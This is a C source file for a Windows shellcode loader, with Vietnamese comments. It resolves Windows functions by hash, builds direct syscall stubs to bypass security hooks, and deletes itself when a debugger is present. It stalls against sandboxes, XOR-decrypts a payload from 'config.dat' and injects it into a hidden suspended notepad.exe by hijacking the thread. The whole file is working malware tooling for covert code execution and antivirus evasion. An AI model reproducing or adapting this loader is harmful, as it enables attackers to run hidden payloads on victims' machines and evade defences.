#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define WIN32_LEAN_AND_MEAN
#define NOGDI
#define NOCRYPT

#define KERNEL32_HASH 0xBE1260896DDB9555ULL
#define NTDLL_HASH    0x0377D2B522D3B5EDULL

#define HASH_CreateFileA                    0xBFCD0791EB96C5FAULL
#define HASH_ReadFile                       0x001AE64071019921ULL
#define HASH_CloseHandle                    0xBFCC17C63870CA07ULL
#define HASH_VirtualAlloc                   0xC692EA02382C0F97ULL
#define HASH_VirtualFree                    0xC032FF55668FCF2EULL
#define HASH_DeleteFileA                    0xBFD05CE61CD88719ULL
#define HASH_GetModuleFileNameA             0xB684C0F813B8A14DULL
#define HASH_GetFileSize                    0xBFE0B8CE7891C520ULL
#define HASH_RtlInitUnicodeString           0x27FF247029B75F89ULL
#define HASH_NtAllocateVirtualMemory        0x5BB3894B6793C34CULL
#define HASH_NtWriteVirtualMemory           0x89C80A6F95F3A792ULL
#define HASH_NtProtectVirtualMemory         0x80E0D54F082962C8ULL
#define HASH_NtGetContextThread             0x63BF2E8A9E0E1A44ULL
#define HASH_NtSetContextThread             0xF359FB6F308BE0D0ULL
#define HASH_NtResumeThread                 0xC0198E0F2C7B3D30ULL
#define HASH_NtQueryInformationProcess      0x95D5B9B1D034FC62ULL
#define HASH_NtQuerySystemTime              0xC434F6FBF6096A71ULL
#define HASH_NtDelayExecution               0x61A4B7100A49084AULL

void ShowErrorAndExit(int code) {
    char msg[64];
    sprintf(msg, "Error code: %d", code);
    MessageBoxA(NULL, msg, "Loader Error", MB_OK | MB_ICONERROR);
    ExitProcess(code);
}

uint64_t djb2_wide(const wchar_t* str) {
    uint64_t hash = 5381;
    while (*str) { hash = ((hash << 5) + hash) + *str; str++; }
    return hash;
}

uint64_t djb2_ansi(const char* str) {
    uint64_t hash = 5381;
    while (*str) { hash = ((hash << 5) + hash) + *str; str++; }
    return hash;
}

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN BitField;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PVOID FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    ULONG CrossProcessFlags;
    ULONG KernelCallbackTable;
    ULONG SystemReserved;
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
} PEB, *PPEB;

typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, *PCURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    PVOID ConsoleHandle;
    ULONG ConsoleFlags;
    PVOID StandardInput;
    PVOID StandardOutput;
    PVOID StandardError;
    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#ifndef STARTF_USESHOWWINDOW
#define STARTF_USESHOWWINDOW 0x00000001
#endif
#ifndef SW_HIDE
#define SW_HIDE 0
#endif
#ifndef CREATE_SUSPENDED
#define CREATE_SUSPENDED 0x00000004
#endif

HMODULE get_module_by_hash(uint64_t hash) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* cur = head->Flink;
    while (cur != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->BaseDllName.Buffer) {
            if (djb2_wide(entry->BaseDllName.Buffer) == hash)
                return (HMODULE)entry->DllBase;
        }
        cur = cur->Flink;
    }
    return NULL;
}

FARPROC get_proc_address_by_hash(HMODULE mod, uint64_t hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((uint8_t*)mod + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* expDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((uint8_t*)mod + expDir->VirtualAddress);
    uint32_t* names = (uint32_t*)((uint8_t*)mod + exp->AddressOfNames);
    uint16_t* ordinals = (uint16_t*)((uint8_t*)mod + exp->AddressOfNameOrdinals);
    uint32_t* funcs = (uint32_t*)((uint8_t*)mod + exp->AddressOfFunctions);
    for (uint32_t i = 0; i < exp->NumberOfNames; i++) {
        if (djb2_ansi((char*)((uint8_t*)mod + names[i])) == hash) {
            return (FARPROC)((uint8_t*)mod + funcs[ordinals[i]]);
        }
    }
    return NULL;
}

uint32_t extract_syscall_number(PVOID func) {
    uint8_t* p = (uint8_t*)func;
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        return *(uint32_t*)(p + 4);
    }
    return 0;
}

PVOID create_syscall_stub(uint32_t ssn) {
    uint8_t* stub = (uint8_t*)VirtualAlloc(NULL, 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!stub) return NULL;
    uint8_t code[] = { 0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
    memcpy(code + 4, &ssn, 4);
    memcpy(stub, code, sizeof(code));
    return stub;
}

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtGetContextThread_t)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI *NtSetContextThread_t)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI *NtResumeThread_t)(HANDLE, PULONG);
typedef NTSTATUS (NTAPI *NtQueryInformationProcess_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtQuerySystemTime_t)(PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    // protected_key và hint_byte được builder in ra, bạn paste vào đây
    uint8_t protected_key[32] = {
        0x80, 0x94, 0x72, 0xD9, 0x86, 0x6B, 0x86, 0xEA,
        0x5E, 0x3F, 0xAD, 0xE4, 0x33, 0x74, 0xC0, 0x2C,
        0xB0, 0xC3, 0x80, 0x87, 0xCE, 0x4E, 0x2A, 0x75,
        0x49, 0x7E, 0xAC, 0x19, 0xCE, 0x16, 0x38, 0x70
    };
    uint8_t hint_byte = 0x1E;

    HMODULE ntdll = get_module_by_hash(NTDLL_HASH);
    HMODULE kernel32 = get_module_by_hash(KERNEL32_HASH);
    if (!ntdll || !kernel32) ShowErrorAndExit(1);

    HANDLE (WINAPI*_CreateFileA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE) =
        (void*)get_proc_address_by_hash(kernel32, HASH_CreateFileA);
    BOOL (WINAPI*_ReadFile)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED) =
        (void*)get_proc_address_by_hash(kernel32, HASH_ReadFile);
    BOOL (WINAPI*_CloseHandle)(HANDLE) =
        (void*)get_proc_address_by_hash(kernel32, HASH_CloseHandle);
    LPVOID (WINAPI*_VirtualAlloc)(LPVOID,SIZE_T,DWORD,DWORD) =
        (void*)get_proc_address_by_hash(kernel32, HASH_VirtualAlloc);
    BOOL (WINAPI*_VirtualFree)(LPVOID,SIZE_T,DWORD) =
        (void*)get_proc_address_by_hash(kernel32, HASH_VirtualFree);
    BOOL (WINAPI*_DeleteFileA)(LPCSTR) =
        (void*)get_proc_address_by_hash(kernel32, HASH_DeleteFileA);
    DWORD (WINAPI*_GetModuleFileNameA)(HMODULE,LPSTR,DWORD) =
        (void*)get_proc_address_by_hash(kernel32, HASH_GetModuleFileNameA);
    DWORD (WINAPI*_GetFileSize)(HANDLE,LPDWORD) =
        (void*)get_proc_address_by_hash(kernel32, HASH_GetFileSize);

    void* RtlInitUnicodeString_ptr = get_proc_address_by_hash(ntdll, HASH_RtlInitUnicodeString);

    NtAllocateVirtualMemory_t NtAllocateVirtualMemory_orig = (void*)get_proc_address_by_hash(ntdll, HASH_NtAllocateVirtualMemory);
    NtWriteVirtualMemory_t   NtWriteVirtualMemory_orig   = (void*)get_proc_address_by_hash(ntdll, HASH_NtWriteVirtualMemory);
    NtProtectVirtualMemory_t NtProtectVirtualMemory_orig = (void*)get_proc_address_by_hash(ntdll, HASH_NtProtectVirtualMemory);
    NtGetContextThread_t     NtGetContextThread_orig     = (void*)get_proc_address_by_hash(ntdll, HASH_NtGetContextThread);
    NtSetContextThread_t     NtSetContextThread_orig     = (void*)get_proc_address_by_hash(ntdll, HASH_NtSetContextThread);
    NtResumeThread_t         NtResumeThread_orig         = (void*)get_proc_address_by_hash(ntdll, HASH_NtResumeThread);
    NtQueryInformationProcess_t NtQueryInformationProcess_orig = (void*)get_proc_address_by_hash(ntdll, HASH_NtQueryInformationProcess);
    NtQuerySystemTime_t      NtQuerySystemTime_orig      = (void*)get_proc_address_by_hash(ntdll, HASH_NtQuerySystemTime);
    NtDelayExecution_t       NtDelayExecution_orig       = (void*)get_proc_address_by_hash(ntdll, HASH_NtDelayExecution);

    if (!_CreateFileA || !_ReadFile || !_CloseHandle || !_VirtualAlloc || !_VirtualFree ||
        !_DeleteFileA || !_GetModuleFileNameA || !_GetFileSize ||
        !RtlInitUnicodeString_ptr || !NtAllocateVirtualMemory_orig || !NtWriteVirtualMemory_orig ||
        !NtProtectVirtualMemory_orig || !NtGetContextThread_orig ||
        !NtSetContextThread_orig || !NtResumeThread_orig || !NtQueryInformationProcess_orig ||
        !NtQuerySystemTime_orig || !NtDelayExecution_orig) ShowErrorAndExit(2);

    uint32_t ssn;
    ssn = extract_syscall_number(NtAllocateVirtualMemory_orig);
    NtAllocateVirtualMemory_t _NtAllocateVirtualMemory = (void*)create_syscall_stub(ssn);
    ssn = extract_syscall_number(NtWriteVirtualMemory_orig);
    NtWriteVirtualMemory_t   _NtWriteVirtualMemory   = (void*)create_syscall_stub(ssn);
    ssn = extract_syscall_number(NtProtectVirtualMemory_orig);
    NtProtectVirtualMemory_t _NtProtectVirtualMemory = (void*)create_syscall_stub(ssn);
    ssn = extract_syscall_number(NtGetContextThread_orig);
    NtGetContextThread_t     _NtGetContextThread     = (void*)create_syscall_stub(ssn);
    ssn = extract_syscall_number(NtSetContextThread_orig);
    NtSetContextThread_t     _NtSetContextThread     = (void*)create_syscall_stub(ssn);
    ssn = extract_syscall_number(NtResumeThread_orig);
    NtResumeThread_t         _NtResumeThread         = (void*)create_syscall_stub(ssn);
    ssn = extract_syscall_number(NtQueryInformationProcess_orig);
    NtQueryInformationProcess_t _NtQueryInformationProcess = (void*)create_syscall_stub(ssn);
    ssn = extract_syscall_number(NtQuerySystemTime_orig);
    NtQuerySystemTime_t      _NtQuerySystemTime      = (void*)create_syscall_stub(ssn);
    ssn = extract_syscall_number(NtDelayExecution_orig);
    NtDelayExecution_t       _NtDelayExecution       = (void*)create_syscall_stub(ssn);

    if (!_NtAllocateVirtualMemory || !_NtWriteVirtualMemory || !_NtProtectVirtualMemory ||
        !_NtGetContextThread || !_NtSetContextThread ||
        !_NtResumeThread || !_NtQueryInformationProcess || !_NtQuerySystemTime || !_NtDelayExecution) ShowErrorAndExit(3);

    HANDLE hDebug = NULL;
    _NtQueryInformationProcess((HANDLE)-1, 7, &hDebug, sizeof(HANDLE), NULL);
    if (hDebug != NULL) {
        CHAR path[MAX_PATH];
        _GetModuleFileNameA(NULL, path, MAX_PATH);
        _DeleteFileA(path);
        ShowErrorAndExit(4);
    }

    LARGE_INTEGER delay;
    delay.QuadPart = -10000;
    for (int i = 0; i < 500; i++) {
        _NtDelayExecution(FALSE, &delay);
        LARGE_INTEGER t;
        _NtQuerySystemTime(&t);
    }

    // Khôi phục key XOR
    uint8_t xor_key[32];
    for (int i = 0; i < 32; i++) {
        xor_key[i] = protected_key[i] ^ hint_byte;
    }

    HANDLE hFile = _CreateFileA("config.dat", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) ShowErrorAndExit(5);
    DWORD fSize = _GetFileSize(hFile, NULL);
    if (fSize == INVALID_FILE_SIZE || fSize == 0) { _CloseHandle(hFile); ShowErrorAndExit(6); }
    uint8_t* enc_buf = (uint8_t*)_VirtualAlloc(NULL, fSize, MEM_COMMIT, PAGE_READWRITE);
    if (!enc_buf) { _CloseHandle(hFile); ShowErrorAndExit(7); }
    DWORD read;
    if (!_ReadFile(hFile, enc_buf, fSize, &read, NULL) || read != fSize) {
        _VirtualFree(enc_buf, 0, MEM_RELEASE);
        _CloseHandle(hFile);
        ShowErrorAndExit(8);
    }
    _CloseHandle(hFile);

    // XOR giải mã (vì XOR đối xứng)
    for (DWORD i = 0; i < fSize; i++) {
        enc_buf[i] ^= xor_key[i % 32];
    }

    // Ghi file giải mã để kiểm tra (tùy chọn)
    FILE* f = fopen("decrypted.bin", "wb");
    if (f) { fwrite(enc_buf, 1, fSize, f); fclose(f); }

    // Injection (giống code đã chạy thành công)
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    wchar_t notepad_path[] = L"C:\\Windows\\System32\\notepad.exe";
    wchar_t cmd_line[260];
    wcscpy(cmd_line, notepad_path);

    if (!CreateProcessW(
        NULL,
        cmd_line,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        DWORD err = GetLastError();
        char errMsg[256];
        sprintf(errMsg, "CreateProcessW failed: %d", err);
        MessageBoxA(NULL, errMsg, "Error", MB_OK);
        _VirtualFree(enc_buf, 0, MEM_RELEASE);
        ShowErrorAndExit(10);
    }

    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    PVOID remoteAddr = NULL;
    SIZE_T regionSize = fSize;
    if (_NtAllocateVirtualMemory(hProcess, &remoteAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
        _NtResumeThread(hThread, NULL);
        _CloseHandle(hThread);
        _CloseHandle(hProcess);
        _VirtualFree(enc_buf, 0, MEM_RELEASE);
        ShowErrorAndExit(11);
    }

    SIZE_T written;
    if (_NtWriteVirtualMemory(hProcess, remoteAddr, enc_buf, fSize, &written) != 0) {
        _VirtualFree(enc_buf, 0, MEM_RELEASE);
        _NtResumeThread(hThread, NULL);
        _CloseHandle(hThread);
        _CloseHandle(hProcess);
        ShowErrorAndExit(12);
    }
    _VirtualFree(enc_buf, 0, MEM_RELEASE);

    ULONG oldProt;
    PVOID protAddr = remoteAddr;
    SIZE_T protSize = fSize;
    if (_NtProtectVirtualMemory(hProcess, &protAddr, &protSize, PAGE_EXECUTE_READ, &oldProt) != 0) {
        _NtResumeThread(hThread, NULL);
        _CloseHandle(hThread);
        _CloseHandle(hProcess);
        ShowErrorAndExit(13);
    }

    CONTEXT thread_ctx;
    thread_ctx.ContextFlags = CONTEXT_FULL;
    if (_NtGetContextThread(hThread, &thread_ctx) != 0) {
        _NtResumeThread(hThread, NULL);
        _CloseHandle(hThread);
        _CloseHandle(hProcess);
        ShowErrorAndExit(14);
    }
    thread_ctx.Rip = (DWORD64)remoteAddr;
    _NtSetContextThread(hThread, &thread_ctx);
    _NtResumeThread(hThread, NULL);

    _CloseHandle(hThread);
    _CloseHandle(hProcess);
    return 0;
}
